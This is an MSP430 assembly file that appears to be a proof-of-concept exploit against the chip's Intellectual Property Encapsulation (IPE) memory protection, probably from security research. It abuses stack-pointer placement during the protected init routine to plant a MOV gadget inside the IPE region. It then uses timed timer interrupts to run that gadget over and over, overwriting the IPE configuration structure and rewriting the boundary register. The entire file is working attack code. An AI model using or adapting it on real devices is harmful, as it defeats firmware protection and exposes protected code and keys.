    .global make_gadget
    .global IPE_encapsulatedInit
    .global IPE_encapsulatedBlink
    .global IPE_encapsulatedKeys
    .global buffer
    .global use_gadget
    .global TA0CTL
    .global TA0CCR0
    .global main
    .global fram_ipe_start
    .global fram_ipe_end

    .sect ".gadg_buf"
correct_struct:
	.word 0x0060
	.word 0x0800
	.word 0x0500
	.word 0xF29F
ssp:
    .word 0

    .sect ".make_gadget_code"
make_gadget:
    mov SP,r4
    mova #fram_ipe_end-4,SP
    calla #IPE_encapsulatedInit
    mov r4,SP ; address should be 0x4FaE = MOV (r15),(r14)
    reta

    .sect ".gadg_buf"
use_gadget:
    mov sp, &ssp
	mov #0x0,r5
	mov #fram_ipe_start, r14
	mov #correct_struct, r15

begin_loop: ; r5 is loop variable
    nop
    eint
    nop

    cmp #8, r5
    jge end

    mov #0x4, &TA0CTL
    mov #0x10, &TA0CCR0
    mov #0x216, &TA0CTL
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    call #fram_ipe_end-8
end:
    mov &ssp, sp
	mov #0xAAAA, &0xFF88 ; attempt to refresh ipe boundaries
	reta

isr_ipe:
    mov #0x0, &TA0CTL

	add #2,r5
	add #2, r14
	add #2,r15

    nop
    eint
    nop
    jmp begin_loop
    nop

    .sect ".int44"
iv_45:
    .word isr_ipe

